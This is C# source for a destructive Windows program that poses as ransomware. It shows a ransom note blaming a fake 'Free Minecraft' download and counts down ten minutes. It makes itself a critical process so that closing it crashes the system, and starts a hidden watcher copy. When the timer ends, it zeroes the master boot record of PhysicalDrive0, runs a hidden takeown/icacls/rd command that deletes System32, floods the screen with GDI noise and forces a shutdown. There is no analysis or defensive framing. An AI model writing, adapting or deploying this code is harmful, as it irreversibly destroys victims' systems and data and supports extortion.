using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace DangerousMemz
{
    class Program : Form
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int n);

        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox txtKey;
        private RichTextBox rtbMessage;
        private static bool isWatcher = false;

        [STAThread]
        static void Main(string[] args)
        {
            // 1. MECHANIZM DWÓCH PROCESÓW (Watcher)
            if (args.Length > 0 && args[0] == "--watcher") {
                isWatcher = true;
            } else {
                Process.Start(Process.GetCurrentProcess().MainModule.FileName, "--watcher");
            }

            Application.EnableVisualStyles();
            
            // Ochrona przed zamknięciem (BSOD)
            try { int i = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref i, 4); } catch {}
            
            Application.Run(new Program());
        }

        public Program()
        {
            if (isWatcher) {
                this.Opacity = 0;
                this.ShowInTaskbar = false;
                this.Load += (s, e) => this.Size = new Size(0, 0);
            }

            this.Text = "Opps, files encrypted";
            this.Size = new Size(1000, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(160, 0, 0); 
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            // UI IDENTYCZNE JAK NA TWOIM SCREENIE
            Label lblMain = new Label() { 
                Text = "Opps, It look like your\nfiles have been\nENCRYPTED", 
                Font = new Font("Arial Black", 24, FontStyle.Bold), 
                ForeColor = Color.White, 
                Location = new Point(30, 40), 
                Size = new Size(420, 180),
                TextAlign = ContentAlignment.MiddleCenter
            };

            lblTimer = new Label() { 
                Text = "10:00", 
                Font = new Font("Consolas", 40, FontStyle.Bold), 
                Location = new Point(600, 30), 
                Size = new Size(350, 70), 
                TextAlign = ContentAlignment.MiddleRight, 
                ForeColor = Color.Yellow 
            };
            
            rtbMessage = new RichTextBox() { 
                Location = new Point(480, 120), 
                Size = new Size(480, 350), 
                BackColor = Color.White, 
                Font = new Font("Segoe UI Semibold", 11), 
                ReadOnly = true,
                Text = "Oops, it looks like your files have been encrypted by \"Free Minecraft.\" Do you seriously think you'll find real Minecraft for free? Well, there are launchers like \"lu*an, fear*her.\" I didn't write what's in the star because of copyright issues, lol. Returning to the virus, to decrypt your computer and save it, contact [UNSETTLED] and I'll reply. Then you'll pay and get the code. Good luck!"
            };

            Label lblKeyHint = new Label() { Text = "Key.", ForeColor = Color.White, Font = new Font("Arial", 10, FontStyle.Bold), Location = new Point(50, 410) };
            txtKey = new TextBox() { Text = "Key.", Font = new Font("Consolas", 12), Location = new Point(50, 435), Size = new Size(380, 30) };
            
            Button btnActivate = new Button() { Text = "ACTIVATE", Location = new Point(50, 480), Size = new Size(180, 45), FlatStyle = FlatStyle.Flat, BackColor = Color.White };
            btnActivate.Click += (s, e) => {
                if (txtKey.Text == "DBI_SECRET-2026") {
                    int n = 0; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref n, 4);
                    foreach (var pr in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName)) pr.Kill();
                } else { MessageBox.Show("Invalid Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            };

            Button btnDestroy = new Button() { Text = "Destroy Now", Location = new Point(780, 480), Size = new Size(180, 45), FlatStyle = FlatStyle.Flat, BackColor = Color.Black, ForeColor = Color.White };
            btnDestroy.Click += (s, e) => { timeLeft = 0; };

            this.Controls.AddRange(new Control[] { lblMain, lblTimer, rtbMessage, lblKeyHint, txtKey, btnActivate, btnDestroy });

            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) { 
                    timeLeft--; 
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); 
                } else { 
                    t.Stop(); 
                    ExecuteDestruction(); 
                }
            };
            t.Start();
        }

        void ExecuteDestruction()
        {
            // 1. NADPISYWANIE MBR (Sektor 0)
            try {
                uint written;
                byte[] mbrData = new byte[512]; // Same zera (pusty sektor startowy)
                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(drive, mbrData, 512, out written, IntPtr.Zero);
            } catch { }

            // 2. KASOWANIE SYSTEM32 (Wymaga uprawnień Admina)
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & takeown /f C:\\Windows\\System32 /r /d y & icacls C:\\Windows\\System32 /grant everyone:F /t & rd /s /q C:\\Windows\\System32") { WindowStyle = ProcessWindowStyle.Hidden });

            // 3. EFEKT ŚNIEŻENIA (GDI Static Noise)
            Thread gdiThread = new Thread(() => {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0); int sh = GetSystemMetrics(1);
                Random r = new Random();
                while(true) {
                    int x = r.Next(sw); int y = r.Next(sh);
                    BitBlt(hdc, x, y, r.Next(200), r.Next(200), hdc, r.Next(sw), r.Next(sh), 0x00CC0020);
                    Thread.Sleep(5); 
                }
            });
            gdiThread.Start();

            // 4. SHUTDOWN PO 60 SEKUNDACH
            Process.Start("shutdown", "/s /t 60 /f /c \"System corruption detected.\"");

            this.Invoke((MethodInvoker)delegate { this.Hide(); });
        }
    }
}
